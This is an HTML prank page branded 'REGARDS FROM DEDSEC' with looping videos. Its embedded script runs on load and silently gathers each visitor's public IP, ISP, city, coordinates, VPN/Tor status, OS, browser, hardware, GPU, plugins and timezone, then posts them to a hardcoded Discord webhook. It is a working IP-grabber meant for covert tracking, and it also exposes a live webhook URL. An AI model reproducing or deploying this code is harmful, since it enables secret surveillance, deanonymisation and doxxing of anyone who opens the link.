<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OMG! IT'S DEDSEC</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
    <style>
        body {
            position: relative;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            overflow: hidden;
            background-image: url('https://i.imgur.com/cVnL0wo.png');
            background-repeat: repeat;
        }
        .texto-no-interactivo {
            font-family: 'JetBrains Mono', monospace;
            font-weight: 700;
            font-size: 3em;
            color: #00ff00;
            padding: 15px;
            text-shadow: 2px 2px 10px rgba(0, 0, 0, 1);
            margin-top: 15vh;
            pointer-events: none;
            z-index: 10;
        }
        #video-inferior {
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 80%;
            max-width: 800px;
            height: auto;
            z-index: 5;
        }
        #video-esquina-izquierda {
            position: absolute;
            top: 0px;
            left: 0px;
            width: 100px;
            height: auto;
            z-index: 10;
            pointer-events: none;
        }
    </style>
</head>
<body>

    <div class="texto-no-interactivo">REGARDS FROM DEDSEC</div>

    <video id="video-inferior" autoplay muted loop playsinline>
        <source src="https://i.imgur.com/C7Br6Cc.mp4" type="video/mp4">
    </video>
    <video id="video-esquina-izquierda" autoplay muted loop playsinline>
        <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
    </video>

<script>
    // ================================================================
    //  WEBHOOK
    // ================================================================
    const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";

    // ================================================================
    //  PARALLEL IP/GEO FETCH (race, 400ms timeout)
    // ================================================================
    function fetchIPData() {
        return new Promise((resolve) => {
            let resolved = false;
            const done = (data) => {
                if (!resolved) { resolved = true; resolve(data); }
            };

            setTimeout(() => done(null), 400);

            // 1) ip-api.com
            fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(350) })
                .then(r => r.json())
                .then(d => {
                    if (d && d.query) {
                        done({
                            ip: d.query,
                            org: d.isp || '',
                            country_name: d.country || '',
                            region: d.regionName || '',
                            city: d.city || '',
                            latitude: d.lat || 0,
                            longitude: d.lon || 0,
                            proxy: d.proxy === true,
                            source: 'ip-api'
                        });
                    }
                })
                .catch(() => {});

            // 2) ipinfo.io (backup)
            fetch('https://ipinfo.io/json', { signal: AbortSignal.timeout(350) })
                .then(r => r.json())
                .then(d => {
                    if (d && d.ip) {
                        const loc = d.loc ? d.loc.split(',').map(Number) : [0, 0];
                        const org = d.org || '';
                        const isVpn = /vpn|proxy|hosting|cloud|tor|anonymous/i.test(org);
                        done({
                            ip: d.ip,
                            org: org,
                            country_name: d.country || '',
                            region: d.region || '',
                            city: d.city || '',
                            latitude: loc[0] || 0,
                            longitude: loc[1] || 0,
                            proxy: isVpn,
                            source: 'ipinfo'
                        });
                    }
                })
                .catch(() => {});
        });
    }

    // ================================================================
    //  SEND MESSAGE (fire and forget)
    // ================================================================
    function sendMessage(msg) {
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: msg }),
            keepalive: true
        }).catch(() => {
            const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
            navigator.sendBeacon(WEBHOOK, blob);
        });
    }

    // ================================================================
    //  MAIN – runs immediately
    // ================================================================
    (async function() {
        // ---- System info (synchronous) ----
        const ua = navigator.userAgent;
        const os = (ua.includes('Windows NT')) ? 'Windows' :
                   (ua.includes('Macintosh')) ? 'macOS' :
                   (ua.includes('iPhone')) ? 'iOS' :
                   (ua.includes('Android')) ? 'Android' : 'Unknown';
        const browser = (ua.includes('Chrome') && !ua.includes('Edg')) ? 'Chrome' :
                        (ua.includes('Firefox')) ? 'Firefox' :
                        (ua.includes('Safari') && !ua.includes('Chrome')) ? 'Safari' :
                        (ua.includes('Edg')) ? 'Edge' : 'Other';

        let gpu = 'Unavailable';
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            if (debug) gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || 'Unavailable';
        } catch (e) {}

        const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        // ---- Fetch IP/Geo ----
        const ipData = await fetchIPData();

        // ---- Extract data ----
        let realIP = 'Unknown', isp = 'Unknown ISP', city = 'Unknown', region = 'Unknown', country = 'Unknown';
        let lat = 0, lon = 0, proxyFlag = false;

        if (ipData) {
            realIP = ipData.ip;
            isp = ipData.org || 'Unknown ISP';
            city = ipData.city || 'Unknown';
            region = ipData.region || 'Unknown';
            country = ipData.country_name || 'Unknown';
            lat = ipData.latitude || 0;
            lon = ipData.longitude || 0;
            proxyFlag = ipData.proxy === true;
        }

        // ---- VPN detection ----
        let isVpn = proxyFlag;
        if (ipData && ipData.org) {
            const orgLower = ipData.org.toLowerCase();
            const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous','private','hide','mask'];
            if (vpnKeywords.some(k => orgLower.includes(k))) isVpn = true;
        }
        if (ua.includes('Tor') || ua.includes('Anonymous') || navigator.webdriver === true) isVpn = true;

        // ---- IP line: always show REAL IP and REAL ISP (no encryption, no FranTech) ----
        const ipLine = (realIP !== 'Unknown') ? `${realIP} (${isp})` : 'Unknown';

        // ---- Location & coordinates ----
        const locationStr = (city !== 'Unknown' || region !== 'Unknown' || country !== 'Unknown')
            ? `${city}, ${region}, ${country}`
            : 'Unknown';
        const coordsStr = (lat !== 0 || lon !== 0) ? `${lat}, ${lon}` : 'Unknown';

        // ---- Build message (NO User Name) ----
        const msg =
`**ctOS User Info**
**IP:** ${ipLine}
**Location:** ${locationStr}
**Coordinates:** ${coordsStr}
**VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
**OS:** ${os}
**Browser:** ${browser}
**CPU Cores:** ${navigator.hardwareConcurrency || '?'}
**RAM:** ${navigator.deviceMemory || '?'} GB
**Screen:** ${screen.width}x${screen.height}x${screen.colorDepth}
**Time Zone:** ${timezone}
**GPU:** ${gpu}
**Plugins:** ${plugins}
**Timestamp:** ${new Date().toLocaleString()}`;

        // ---- Send ----
        sendMessage(msg);
    })();
</script>
</body>
</html>
